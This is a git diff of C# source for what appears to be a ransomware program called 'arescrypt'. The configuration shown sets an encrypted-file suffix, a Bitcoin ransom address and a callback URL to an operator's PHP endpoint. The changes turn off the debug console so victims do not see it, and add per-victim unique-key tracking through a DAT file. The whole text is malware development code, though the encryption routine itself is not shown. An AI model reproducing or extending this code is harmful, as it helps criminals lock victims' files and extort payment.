@@ -8,7 +8,7 @@
         // Debugging configuration
         public bool sandBox = true; // Safemode for testing/debugging
         public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
-        public bool debugMode = true; // Debug mode will enable/disable display of the Debug Console/GUI
+        public bool debugMode = false; // Debug mode will enable/disable display of the Debug Console/GUI
 
         // Encryption/Decryption configuration
         public string encryptedFileSuffix = ".enc";
@@ -20,7 +20,7 @@
         public string cryptoAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"; // insert Bitcoin/Litecoin/Zcash address here
 
         // DAT file configuration
-        public string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
+        public static string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
         // Variables to be set by GetDATFileData()
         // Server Data
         public static string callbackServer = "localhost";
@@ -28,8 +28,27 @@
         public static string callbackURL = "http://" + callbackServer + "/arescrypt.php";
     }
 
-    class ServerData
+    class UserData
     {
         public string uniqueKey { get; set; }
+
+        public string getUniqueKey()
+        {
+            if (!System.IO.File.Exists(Configuration.datFileLocation))
+            {
+                this.uniqueKey = Cryptography.genRandomString(0xC);
+
+                System.Console.WriteLine("No DAT file discovered, creating one now..");
+                Miscellaneous.SetDATFileData(this);
+                System.Console.WriteLine("DAT file created [" + Configuration.datFileLocation + "]");
+            }
+            else
+            {
+                System.Console.WriteLine("Reading dat file...");
+                UserData serveJSONData = Miscellaneous.GetDATFileData();
+                this.uniqueKey = serveJSONData.uniqueKey;
+            }
+            return this.uniqueKey;
+        }
     }
 }
